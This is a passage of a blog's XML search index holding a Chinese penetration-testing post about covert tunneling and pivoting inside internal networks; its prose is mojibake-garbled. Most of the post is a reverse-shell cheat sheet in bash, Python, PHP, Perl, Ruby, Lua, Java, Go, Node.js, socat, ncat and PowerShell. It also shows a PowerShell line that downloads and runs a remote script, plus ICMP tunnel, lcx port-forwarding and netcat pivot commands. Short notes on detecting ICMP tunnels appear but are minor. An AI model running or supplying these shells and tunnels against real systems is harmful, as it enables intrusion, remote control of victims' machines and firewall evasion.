        <tag>æ–‡ä»¶åŠ å¯†</tag>
        <tag>AppArmor</tag>
        <tag>ClamAV</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[å†…ç½‘ç¬¬ä¸‰ç« -éšè—éš§é“é€šä¿¡æŠ€æœ¯]]></title>
    <url>%2Fposts%2F35263%2F</url>
    <content type="text"><![CDATA[å†…ç½‘ç¬¬ä¸‰ç« -éšè—éš§é“é€šä¿¡æŠ€æœ¯å†…ç½‘è¿é€šæ€§åˆ¤æ–­ å¸¸ç”¨åˆ¤æ–­æ–¹æ³•1.ICMPåè®® ping &lt;IP> 2.TCPåè®® nc -zv &lt;IP> &lt;port> 3.HTTPåè®® curl ip:port 4.DNSåè®® # 1. nslookup www.baidu.com vps-ip # vps-ipæ˜¯dnsæœåŠ¡å™¨çš„åœ°å€ # 2. dig @vps-ip www.baidu.com è‹¥æµé‡ä¸èƒ½ç›´æ¥æµå‡º å¸¸è§äºä¼ä¸šåŠå…¬ç½‘æ®µä¸Šç½‘çš„åœºæ™¯ æŸ¥çœ‹ç½‘ç»œé“¾æ¥ï¼Œåˆ¤æ–­æ˜¯å¦å­˜åœ¨ä¸å…¶ä»–æœºå™¨çš„8080(ä¸ç»å¯¹)ç­‰ç±»ä¼¼ç«¯å£çš„è¿æ¥(å¯ä»¥å°è¯•è¿è¡Œping -n 1 -a &lt;ip&gt;) æŸ¥çœ‹å†…ç½‘ä¸­æ˜¯å¦æœ‰ä¸»æœºåç±»ä¼¼äºproxyçš„æœºå™¨ æŸ¥çœ‹IEæµè§ˆå™¨çš„ç›´æ¥ä»£ç† æ ¹æ®pacæ–‡ä»¶çš„è·¯å¾„(å¯èƒ½æ˜¯æœ¬åœ°è·¯å¾„ï¼Œä¹Ÿå¯èƒ½æ˜¯è¿œç¨‹è·¯å¾„)ï¼Œå°†å…¶ä¸‹è½½ä¸‹æ¥å¹¶æŸ¥çœ‹ã€‚ æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼Œåˆ©ç”¨curlå·¥å…·è¿›è¡Œç¡®è®¤ curl www.baidu.com # ä¸é€š curl -x proxy-ip:port www.baidu.com # é€š ç½‘ç»œå±‚éš§é“æŠ€æœ¯ IPv6éš§é“ ICMPéš§é“ IPv6éš§é“å¸¸è§å·¥å…·ï¼šsocat,6tunnel,nt6tunnelç­‰ æ¦‚å¿µï¼šé€šè¿‡IPv6éš§é“ä¼ é€IPv6æ•°æ®æŠ¥æ–‡(æŠŠIPv6æŠ¥æ–‡æ•´ä½“å°è£…åœ¨IPv4æ•°æ®æŠ¥æ–‡ä¸­ï¼Œä½¿å¾—IPv6æŠ¥æ–‡ç©¿è¿‡IPv4æµ·æ´‹ï¼Œåˆ°è¾¾å¦ä¸€ä¸ªIPv6å°å²›)çš„æŠ€æœ¯ ç°é˜¶æ®µçš„è¾¹ç•Œè®¾å¤‡ã€é˜²ç«å¢™ç”šè‡³å…¥ä¾µé˜²å¾¡ç³»ç»Ÿè¿˜æ— æ³•è¯†åˆ«IPv6çš„é€šä¿¡æ•°æ®ï¼Œè€Œå¤§å¤šæ•°çš„æ“ä½œç³»ç»Ÿæ”¯æŒIPv6ï¼Œæ‰€æœ‰éœ€è¦æ‰‹åŠ¨é…ç½®(winçš„ç½‘ç»œå±æ€§ä¸­)Noteï¼šå³ä½¿è®¾å¤‡æ”¯æŒIPv6ï¼Œä¹Ÿå¯èƒ½æ— æ³•æ­£ç¡®åˆ†æå°è£…äº†IPv6æŠ¥æ–‡çš„IPv4æ•°æ®åŒ… é…ç½®éš§é“ä¸è‡ªåŠ¨éš§é“çš„åŒºåˆ«ï¼šåªæœ‰åœ¨æ‰§è¡Œéš§é“åŠŸèƒ½çš„èŠ‚ç‚¹çš„IPv6åœ°å€æ˜¯å…¼å®¹IPv4åœ°å€æ—¶ï¼Œè‡ªåŠ¨éš§é“æ‰æ˜¯å¯è¡Œçš„ã€‚åœ¨ä¸ºæ‰§è¡Œéš§é“åŠŸèƒ½çš„èŠ‚ç‚¹åˆ†é…ipåœ°å€æ—¶ï¼Œå¦‚æœé‡‡ç”¨çš„æ˜¯è‡ªåŠ¨éš§é“æ–¹æ³•ï¼Œå°±ä¸éœ€è¦è¿›è¡Œè®¾ç½®ã€‚é…ç½®éš§é“æ–¹æ³•åˆ™è¦æ±‚éš§é“æœ«ç«¯èŠ‚ç‚¹ä½¿ç”¨å…¶ä»–æœºåˆ¶æ¥è·å¾—å…¶IPv4åœ°å€ï¼Œä¾‹å¦‚ï¼šDHCP/äººå·¥é…ç½®æˆ–å…¶ä»–IPv4çš„é…ç½®æœºåˆ¶ é˜²å¾¡ï¼šäº†è§£IPv6çš„å…·ä½“æ¼æ´ï¼Œç»“åˆå…¶ä»–åè®®ï¼Œé€šè¿‡é˜²ç«å¢™å’Œæ·±åº¦é˜²å¾¡ç³»ç»Ÿè¿‡æ»¤IPv6é€šä¿¡ ICMPéš§é“å¸¸è§å·¥å…·ï¼šicmpsh,PingTunnel,icmptunnel,powershell icmpç­‰ æ¯”è¾ƒç‰¹æ®Šçš„åè®®ï¼Œä¸ç”¨å¼€æ”¾ç«¯å£ï¼Œæœ€å¸¸è§çš„ICMPæ¶ˆæ¯ä¸ºpingå‘½ä»¤çš„å›å¤ã€‚å°†TCP/UDPæ•°æ®åŒ…å°è£…åˆ°ICMPçš„pingæ•°æ®åŒ…ä¸­ï¼Œä»è€Œç©¿è¿‡é˜²ç«å¢™ã€‚ å·¥å…·1.icmpsh # ä¸éœ€è¦ç®¡ç†å‘˜æƒé™ # ç®€å•ï¼Œä¸å­˜åœ¨æ­£å‘åå‘ # ä¸‹è½½åœ°å€: https://github.com/inquisb/icmpsh # æœ¬æœºå’Œç›®æ ‡éƒ½è¦å®‰è£… # å®‰è£…ä¾èµ–åº“ apt-get install python-impacket ### ä½¿ç”¨ # æˆ‘æœºå™¨æ‰§è¡Œ # å…ˆå…³é—­æœ¬åœ°ç³»ç»Ÿçš„icmpåº”ç­”(æ¢å¤æ”¹ä¸º0å°±è¡Œ) -> å¦åˆ™ä¼šæ— é™åˆ·å± sysctl -w net.ipv4.icmp_echo_ignore_all=1 ./run.sh # è¾“å…¥ç›®æ ‡çš„å…¬ç½‘ip ï¼ˆæ­¤æ–‡ä»¶å¥½åƒä¸å¯¹ï¼Œç”¨ä¸‹é¢çš„pyæ–‡ä»¶å§ï¼‰ # æˆ–è€… ./icmpsh_m.py IP(å…¬ç½‘) IP(å†…ç½‘çš„å…¬ç½‘ip) # è¿™ä¸ªçš„å…¬ç½‘ipè·å–æ–¹æ³•ï¼špingå¤–é¢ï¼Œåœ¨å¤–é¢æŠ“åŒ…è·å–æ•°æ®åŒ…çš„æºåœ°å€ / è®¿é—®å¤–é¢çš„åœ°å€ç„¶åæŸ¥çœ‹ç½‘ç«™è®¿é—®æ—¥å¿—ç­‰ # ç›®æ ‡æœºå™¨æ‰§è¡Œï¼ˆè¿™é‡Œä½¿ç”¨çš„winç‰ˆæœ¬ï¼‰ icmp.exe -t 192.168.1.7 -d 500 -b 30 -s 128 # 192.168.1.7æˆ‘çš„vps # æˆ‘çš„vpså°±ä¼šæ¥æ”¶åˆ°åå¼¹è¿‡æ¥çš„shell 2.PingTunnel # ä¸‹è½½åœ°å€ï¼šhttp://freshmeat.sourceforge.net/projects/ptunnel/ # è²Œä¼¼å¯ä»¥è¿™ä¹ˆå®‰è£…ï¼šsudo apt install ptunnel # å¯è·¨å¹³å°ä½¿ç”¨ã€‚ä¸ºäº†é¿å…æ»¥ç”¨ï¼Œå¯ä¸ºéš§é“è®¾ç½®å¯†ç  # æƒ…æ™¯ï¼šå¾—åˆ°çš„å†…ç½‘ä¸»æœºæ— æ³•3389è¿æ¥åˆ°æ•°æ®åº“æœåŠ¡å™¨ï¼Œä½†æ˜¯å¯ä»¥pingé€šã€‚æˆ‘ä»¬éœ€ä»¥æ­¤æœºå™¨ä¸ºè·³æ¿è®¿é—®å¦ä½“è´´æ•°æ®åº“æœåŠ¡å™¨ # é¦–å…ˆåœ¨ä¸¤å°æœºå™¨éƒ½å®‰è£…ä¸Šæ­¤å·¥å…· ## å®‰è£…æ–¹æ³• #1.å®‰è£…ç¼–è¯‘ tar -zxvf ... cd ... make &amp;&amp; make install #2.å¦‚æœç¼ºå°‘pcap.h(æ•°æ®åŒ…æ•è·å‡½æ•°åº“),å°±å®‰è£… wget http://www.tcpdump.org/release/libpcap-1.9.0.tar.gz tar -zxvf ... cd ... ./configure #3.å¦‚æœyaccåŒ…é”™è¯¯ï¼Œå®‰è£… sudo apt-get install -y byacc sudo apt-get install flex bison #å¥½äº†ä¹‹åå†å®‰è£…ä¸€é ./configure make &amp;&amp; make install # æŸ¥çœ‹å¸®åŠ©ä¿¡æ¯ man pcap ## ä½¿ç”¨æ–¹æ³• #4.è¿è¡ŒPingTunnel(ç°åœ¨æ˜¯linuxä¸Šä½¿ç”¨ï¼Œä¹Ÿå¯åœ¨winä¸Šä½¿ç”¨ï¼Œåªä¸è¿‡éœ€è¦åœ¨å†…ç½‘çš„winæœåŠ¡å™¨å®‰è£…wincapç±»åº“) # è·³æ¿æœºå™¨(å‡è®¾æ˜¯å·²è·å–åˆ°çš„webæœåŠ¡å™¨)ï¼š ptunnel -x shuteer111 # VPSä¸Šï¼š ptunnel -p &lt;è·³æ¿_IP> -lp 1080 -da &lt;å¦ä¸€æ–°ç›®æ ‡_IP> -dp 3389 -x shuteer111 # å«ä¹‰ï¼šåœ¨è®¿é—®æœ¬åœ°çš„1080ç«¯å£æ—¶ï¼Œä¼šæŠŠæ•°æ®åº“æœåŠ¡å™¨(æ–°ç›®æ ‡)çš„3389æ•°æ®å°è£…åœ¨icmpéš§é“ä¸­ï¼Œä»¥webæœåŠ¡å™¨ä¸º'ICMPéš§é“è·³æ¿'è¿›è¡Œä¼ é€(çª—å£ä¼šæ˜¾ç¤ºæ˜¯æœ¬åœ°çš„ipï¼Œä½†æ˜¯å®é™…æ˜¯å¦ä¸€å°æ•°æ®åº“æœåŠ¡å™¨çš„) #5.åœ¨æ”»å‡»æœºå™¨è®¿é—®æœ¬åœ°çš„1080ç«¯å£ï¼ŒæˆåŠŸè®¿é—®åˆ°å¦ä¸€å°æ•°æ®åº“æœåŠ¡å™¨çš„3389ç«¯å£ å‚æ•°è¯´æ˜ï¼š -x # æŒ‡å®šicmpéš§é“è¿æ¥éªŒè¯å¯†ç  -p # æŒ‡å®šicmpéš§é“å¦ä¸€ç«¯æœºå™¨(è·³æ¿)çš„ipåœ°å€ -lp # æŒ‡å®šè¦ç›‘å¬çš„æœ¬åœ°tcpç«¯å£ -da # æŒ‡å®šè¦è½¬å‘çš„æœºå™¨çš„ipåœ°å€ -dp # æŒ‡å®šè¦è½¬å‘çš„æœºå™¨çš„tcpç«¯å£ å…¶ä»–å·¥å…· é˜²å¾¡æ–¹æ³•é€šè¿‡Wiresharkè¿›è¡ŒICMPæ•°æ®åŒ…åˆ†æï¼Œå¦‚ä¸‹ï¼š æ£€æŸ¥åŒä¸€æ¥æºçš„ICMPæ•°æ®åŒ…çš„æ•°é‡ã€‚ä¸€ä¸ªæ­£å¸¸çš„pingå‘½ä»¤æ¯ç§’æœ€å¤šå‘é€ä¸¤ä¸ªæ•°æ®åŒ…ï¼Œè€Œä½¿ç”¨ICMPéš§é“çš„æµè§ˆå™¨ä¼šåœ¨å¾ˆçŸ­çš„æ—¶é—´å†…äº§ç”Ÿä¸Šåƒä¸ªICMPæ•°æ®åŒ… æ³¨æ„é‚£äº›Payloadå¤§äº64bitçš„ICMPæ•°æ®åŒ… å¯»æ‰¾å“åº”æ•°æ®åŒ…çš„Payloadä¸è¯·æ±‚æ•°æ®åŒ…ä¸­çš„Payloadä¸ä¸€è‡´çš„ICMPæ•°æ®åŒ… æ£€æŸ¥ICMPæ•°æ®åŒ…çš„åè®®æ ‡ç­¾ã€‚ä¾‹å¦‚ï¼šicmptunnelä¼šåœ¨æ‰€æœ‰çš„ICMP Payloadå‰é¢æ·»åŠ â€TUNLâ€æ ‡è®°æ¥æ ‡è¯†éš§é“ -&gt; è¿™å°±æ˜¯ç‰¹å¾ ä¼ è¾“å±‚éš§é“æŠ€æœ¯ä¼ è¾“å±‚æŠ€æœ¯åŒ…æ‹¬ï¼šTCPéš§é“ã€UDPéš§é“ã€å¸¸è§„ç«¯å£è½¬å‘ç­‰ è‹¥å†…ç½‘é˜²ç«å¢™é˜»æ­¢äº†æŒ‡å®šç«¯å£çš„è®¿é—®ï¼Œåœ¨è·å¾—ç›®æ ‡ä¸»æœºæƒé™åï¼Œå¯ä»¥ä½¿ç”¨iptablesæ‰“å¼€æŒ‡å®šç«¯å£ 1.lcxç«¯å£è½¬å‘ä¸¤ä¸ªç‰ˆæœ¬ï¼š Linux ç‰ˆæœ¬ï¼športmap Widowsç‰ˆæœ¬ï¼šlcx.exe ä¸€ä¸ªå®¢æˆ·ç«¯ä¸€ä¸ªæœåŠ¡ç«¯ lcxå†…ç½‘ç«¯å£è½¬å‘ å…ˆä¼ lcxåˆ°ç›®æ ‡æœºå™¨ #åœ¨å†…ç½‘ç›®æ ‡shellä¸Š: l cx -slave å…¬ç½‘ip 4444 127.0.0.1 3389 # æŠŠç›®æ ‡æœºå™¨çš„3389æµé‡è½¬å‘åˆ°æŒ‡å®šæœåŠ¡å™¨(vps)æŒ‡å®šç«¯å£ #vpsæœåŠ¡å™¨(æˆ‘çš„)ä¸Šæ‰§è¡Œï¼š lcx -listen 4444 33891 # å°†æœ¬åœ°4444ç«¯å£ä¸Šç›‘å¬çš„æ‰€æœ‰æ•°æ®è½¬å‘åˆ°æœ¬æœº33891ç«¯å£ #ç„¶åè¿œç¨‹æ¡Œé¢è¿æ¥æœ¬åœ°çš„33891ç«¯å£å³å¯ lcxæœ¬åœ°ç«¯å£æ˜ å°„ # å¦‚æœç›®æ ‡é˜²ç«å¢™ é™åˆ¶äº†éƒ¨åˆ†ç«¯å£çš„æ•°æ®(å¦‚3389)ï¼Œå¯ä»¥è¿›è¡Œç«¯å£è½¬å‘ï¼šæŠŠ3389ç«¯å£çš„æ•°æ®è½¬å‘åˆ°é˜²ç«å¢™å…è®¸çš„å…¶ä»–ç«¯å£(å¦‚:53) # åœ¨ç›®æ ‡ä¸»æœºæ‰§è¡Œ lcx -tran 53 &lt;ç›®æ ‡ip>: 3389 linuxç‰ˆçš„portmap # ä¸‹è½½åœ°å€ï¼šhttp://www.vuln.cn/wp-content/uploads/2016/06/lcx_vuln.cn_.zip # vps ./portmap -m 2 -p1 6666 -h2 å…¬ç½‘ip -p2 7777 # ç›®æ ‡å†…ç½‘æœºå™¨ ./portmap -m 3 -h1 127.0.0.1 -p1 22 -h2 å…¬ç½‘ip -p2 6666 2.netcatå®‰è£… ## Linux # http://sourceforge.net/projects/netcat/files/netcat/0.7.1/netcat-0.7.1.tar.gz/download #1. apt-get install netcat # 2. wget ... tar -zxvf ... cd ... ./configure make ## Windows https://joncraton.org/files/nc111nt.zip https://joncraton.org/files/nc111nt_safe.zip å‚æ•° ä½¿ç”¨BanneræŠ“å– # bannerå¯æ ‡è¯†æœåŠ¡çš„ç‰ˆæœ¬ç­‰ä¿¡æ¯ # é¢˜å¤–è¯:è¿½è¸ªè·¯ç”± mtr 114.114.114.114 ## ncä½œä¸ºå®¢æˆ·ç«¯ï¼š # å‚æ•° -v æ˜¾ç¤ºè¯¦ç»†ä¿¡æ¯ # å‚æ•° -n å¦‚æœæ˜¯åŸŸå,ä¸è¿›è¡ŒåŸŸåè§£æ(å»ºè®®ç›´æ¥è·Ÿipåœ°å€) nc -nv 1.1.1.1 110 # è¿æ¥pop3æœåŠ¡å™¨ï¼Œå¯ä»¥çœ‹åˆ°bannerä¿¡æ¯ï¼ˆå¯ä»¥è¿›è¡Œuserç™»å½•[base64ç¼–ç ],è¾“å…¥æŒ‡ä»¤ï¼‰ nc -nv 1.1.1.1 25 # smtpæœåŠ¡å™¨ nc -nv 1.1.1.1 80 # æ¢æµ‹80ç«¯å£(éƒ½å¯è¿›è¡Œäº¤äº’çš„å‘½ä»¤) è¿æ¥åˆ°è¿œç¨‹ä¸»æœº nc -nvv 1.1.1.1 110 ç«¯å£æ‰«æ #å¹¶éæ“…é•¿ç«¯å£æ‰«æ, è¿˜æ…¢ #å‚æ•° -z æ‰«æå‚æ•°ï¼Œåªåˆ¤æ–­æ˜¯å¦å¼€æ”¾ï¼ˆé»˜è®¤tcpï¼‰ nc -nvz 1.1.1.1 20-8080 #å‚æ•° -u æ‰«æudpæœåŠ¡çš„ç«¯å£ ï¼ˆä¸å¤ªå‡†ç¡®ï¼‰ nc -nvzu 1.1.1.1 1-1024 ç«¯å£ç›‘å¬ nc -l -p 999 # ä¹ æƒ¯ nc -lvvp 9999 æ–‡ä»¶ä¼ è¾“ # ä¸€æ—¦è¿æ¥å»ºç«‹ï¼Œæ•°æ®æµå°±ä¼šä¼ å…¥ï¼Œæ¥æ”¶æ–‡ä»¶ nc -lp 333 >1.txt # å‘é€æ–‡ä»¶å†…å®¹ nc -nv 192.168.0.11 &lt; test.txt -q 1 #å‚æ•° -q: è¾“å‡ºå®Œæˆä¹‹åè¿‡1ç§’å°±æ–­å¼€ ç®€æ˜“èŠå¤© nc -l -p 8888 nc -vn 192.168.0.11 8888 è·å–shell # å‚è€ƒï¼šhttps://www.uedbox.com/post/54632 # https://www.secpulse.com/archives/76223.html ##### ncæ­£å‘shellï¼ˆæ­£å‘shell -> å†…ç½‘æœåŠ¡å™¨ä¹‹é—´ï¼‰ 1.ç›®æ ‡ä¸»æœºç›‘å¬ï¼š nc -lvvp 4444 -e /bin/bash # linux nc -lvvp 4444 -e c:\\WINDOWS\system32\cmd.exe # win 2.æœ¬æœºè¿æ¥ç›®æ ‡ nc 192.168.1.11 4444 ##### ncåå‘shell 1.æœ¬æœº nc -lvvp 3333 2.ç›®æ ‡æœºå™¨æ‰§è¡Œ nc 192.168.0.111 3333 -c /bin/bash # Linux nc 192.168.0.111 -e c:\\WINDOWS\system32\cmd.exe # win ###### å¦‚æœç›®æ ‡ä¸»æœºæ²¡æœ‰ncï¼Œè·å–åå‘shell ###### æˆ–è€…å‡å¦‚ncä¸æ”¯æŒ-c æˆ–è€… -e å‚æ•°ï¼ˆopenbsd netcatï¼‰,æˆ‘ä»¬ä»ç„¶èƒ½å¤Ÿåˆ›å»ºè¿œç¨‹shell # bashåå¼¹shell /bin/bash -c bash -i >&amp; /dev/tcp/192.168.41.13/4444 0>&amp;1 # bashåå¼¹shell(TCP) ç›®æ ‡æœºå™¨ï¼š bash -i >&amp; /dev/tcp/192.168.41.133/4444 0>&amp;1 æ”»å‡»æ–¹ï¼š nc -lvvp 4444 # bashåå¼¹shell(UDP) ç›®æ ‡æœºå™¨ï¼š bash -i >&amp; /dev/tcp/192.168.41.133/4444 0>&amp;1 æ”»å‡»æ–¹ç›‘å¬ï¼š nc -u -lvp 4444 # pythonåå‘shell // æ–¹æ³•ä¸€ $ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' // æ–¹æ³•äºŒ $ export RHOST="127.0.0.1";export RPORT=12345;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")' # windows pythonåå¼¹shell C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('10.11.0.37', 4444)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))" # phpåå‘shell php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i &lt;&amp;3 >&amp;3 2>&amp;3");' # Perlåå‘shell perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&amp;S");open(STDOUT,">&amp;S");open(STDERR,">&amp;S");exec("/bin/sh -i");};' # perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"[IPADDR]:[PORT]");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while&lt;>;' #NOTE: Windows only perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"[IPADDR]:[PORT]");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while&lt;>;' # Rubyåå‘shell ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i &lt;&amp;%d >&amp;%d 2>&amp;%d",f,f,f)' #ä¸ä¾èµ–äº/bin/shçš„åå¼¹shell ruby -rsocket -e 'exit if fork;c=TCPSocket.new("attackerip","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end' #å¦‚æœç›®æ ‡ç³»ç»Ÿè¿è¡ŒWindowsåå¼¹shell ruby -rsocket -e 'c=TCPSocket.new("attackerip","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end' # Luaåå‘shell #Linux lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','1234');os.execute('/bin/sh -i &lt;&amp;3 >&amp;3 2>&amp;3');" #Windows lua5.1 -e 'local host, port = "127.0.0.1", 4444 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()' # Javaåå¼¹shell r = Runtime.getRuntime() p = r.exec(["/bin/bash","-c","exec 5&lt;>/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2>&amp;5 >&amp;5; done"] as String[]) p.waitFor() # socatåå¼¹shell socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.79.137:5555 # Golangåå¼¹shell echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","192.168.0.134:8080");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go &amp;&amp; go run /tmp/t.go &amp;&amp; rm /tmp/t.go # Telnetåå¼¹shell rm -f /tmp/p; mknod /tmp/p p &amp;&amp; telnet ATTACKING-IP 80 0/tmp/p #è·å–åå¼¹shellåï¼Œå¯ä½¿ç”¨pythonè·å¾—äº¤äº’å¼shell python -c'import pty; pty.spawn("/bin/bash")' python -c ''' import pty while(1): try: pty.spawn("/bin/bash") except : contiune''' # Nodejsåå¼¹shell (function(){ var net = require("net"), cp = require("child_process"), sh = cp.spawn("/bin/sh", []); var client = new net.Socket(); client.connect(8080, "10.17.26.64", function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }); return /a/; // Prevents the Node.js application form crashing })(); or require('child_process').exec('nc -e /bin/sh [IPADDR] [PORT]') or -var x = global.process.mainModule.require -x('child_process').exec('nc [IPADDR] [PORT] -e /bin/bash') or https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py # ncatåå‘shell ncat 127.0.0.1 4444 -e /bin/bash ncat --udp 127.0.0.1 4444 -e /bin/bash # åŠ å¯† A: ncat -c bash -allow 192.168.1.20 -vnl 3333 --ssl #è¢«æ§ç«¯(æœåŠ¡å™¨ç«¯) -allowå…è®¸è¿æ¥çš„ipï¼Œ ç«¯å£, sslåŠ å¯† B: ncat -nv 192.168.1.19 3333 --ssl #æ”»å‡»ç«¯ # ç›‘å¬ç«¯å£ ncat -lvvp 777 # OpenSSLåå¼¹shell # crontabåå¼¹shell # MSFç”Ÿæˆåå¼¹shell # Powershellåå¼¹shell powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("[IPADDR]",[PORT]);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&amp;1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close() # æˆ– powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.1.3.40',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&amp;1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()" # æˆ– powershell IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1') å†…ç½‘ä»£ç† # åœºæ™¯ï¼šé€šè¿‡æ‹¿åˆ°çš„ä¸€å°èƒ½è®¿é—®çš„å†…ç½‘ä¸»æœº1ï¼Œä½œä¸ºè·³æ¿(vpsä¸èƒ½ç›´æ¥è®¿é—®å†…ç½‘ä¸»æœº2)ï¼Œæ‹¿åˆ°å¦å¤–ä¸€å°å†…ç½‘ä¸»æœº1æ‰èƒ½è®¿é—®åˆ°çš„å†…ç½‘ä¸»æœº2çš„shell # vpsç›‘å¬ nc -lvp 3333 # å†…ç½‘ä¸»æœº2æ‰§è¡Œ nc -lvp 3333 -e /bin/bash # å†…ç½‘ä¸»æœº1(è¾¹ç•ŒæœåŠ¡å™¨)æ‰§è¡Œ nc -v vps_ip -c "nc -v å†…ç½‘ä¸»æœº2_ip 3333" 3.PowerCat å¯ä»¥è¯´æ˜¯ncçš„powershellç‰ˆæœ¬ ä¸‹è½½åœ°å€ï¼šhttps://github.com/besimorhino/powercat.git ç”¨æ³•# å¯¼å…¥æ¨¡å— Import-Moudle .\powercat.ps1 æ—¢ç„¶è¯´æ˜¯ncçš„powershellç‰ˆæœ¬ï¼Œé‚£å°±å¯ä»¥ä¸ncé…åˆè¿æ¥:1.é€šè¿‡ncæ­£å‘è¿æ¥powercat # ç›®æ ‡æœºå™¨ç”¨powercatç›‘å¬ powercat -l -p 8080 cmd.exe -v # æ”»å‡»æœºè¿æ¥ nc 192.168.56.130 8080 -vv #å‚æ•° -l # ç›‘å¬ -p # æŒ‡å®šç«¯å£ -c # æŒ‡å®šè¦å¯åŠ¨è¿›ç¨‹çš„åå­— -v # æ˜¾ç¤ºè¯¦æƒ… 2.é€šè¿‡ncåå‘è¿æ¥powercat # æ”»å‡»æœºå™¨ç›‘å¬ nc -lvv -p 8888 # ç›®æ ‡æœºå™¨ç”¨powercatè¿æ¥æˆ‘ä»¬ powercat -c 192.168.56.129 -p 8888 -v -e cmd.exe é€šè¿‡powercatè¿”å›powershell # å¦‚æœæƒ³è¿”å›powershellï¼Œå°±æ— æ³•ä¸ncè¿›è¡Œäº¤äº’ # å»ºç«‹æ­£å‘shell # åœ¨ç›®æ ‡æœºå™¨æ‰§è¡Œ IEX(New-Object Net.WebClient).DownloadString("http://10.10.10.1/powercat.ps1"); powercat -l -p 9999 -v # åœ¨å®¢æˆ·ç«¯ powercat -c 10.10.10.129 -p 9999 -v -ep # -epç”¨äºè¿”å›powershell é€šè¿‡powercatä¼ é€’æ–‡ä»¶ # 